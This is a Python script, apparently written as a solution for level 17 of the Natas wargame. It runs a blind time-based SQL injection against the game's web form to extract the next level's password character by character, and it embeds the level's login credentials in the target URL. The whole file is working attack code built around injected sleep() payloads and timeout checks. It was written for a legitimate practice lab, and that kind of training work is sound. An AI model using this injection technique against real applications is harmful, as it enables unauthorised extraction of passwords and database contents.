# Created by Joao Godinho
#    October 2014
# Script to brute force level 17 of natas wargames
# Refer to http://floatingbytes.blogspot.com for details

# Library to work with the POST requests
import requests

# All possible characters
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# Parsed characters, the ones that actually exist in the password
parsedChars = ''
# Final Password
password = ''
# Our target URL
target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'

# Checking if we can connect to the target, just in case...
r = requests.get(target)
if r.status_code != requests.codes.ok:
    raise ValueError('Kabum? Couldn\'t connect to target :(')
else:
    print 'Target reachable. Starting character parsing...'


# The fun begin, let's see what characters are actually part of the pwd
for c in allChars:
    # SQL time-based injection #1
    try:
        r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%'+c+'%", sleep(5), null) %23', timeout=1)
    except requests.exceptions.Timeout:
        # If we got a timeout, the character exists
        parsedChars += c
        print 'Used chars: ' + parsedChars

print 'Characters parsed. Starting brute force...'

# Assuming password is 32 characters long
for i in range(32):
    for c in parsedChars:
        # SQL time-based injection #2
        try:
            r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
        # Did we found the character at the i position of the password?
        except requests.exceptions.Timeout:
            password += c
            print 'Password: ' + password + '*' * int(32 - len(password))
            break

print 'Done. Have fun!'
